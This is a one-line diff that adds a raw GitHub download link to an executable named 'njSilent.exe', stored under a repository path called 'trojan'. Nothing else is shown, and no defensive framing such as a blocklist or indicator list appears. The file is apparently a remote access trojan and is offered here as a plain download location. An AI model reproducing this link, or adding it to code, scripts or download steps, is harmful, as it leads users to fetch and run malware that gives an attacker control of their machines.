@@ -1,0 +1,1 @@
+https://raw.githubusercontent.com/PaketPK/trojan/refs/heads/main/njSilent.exe
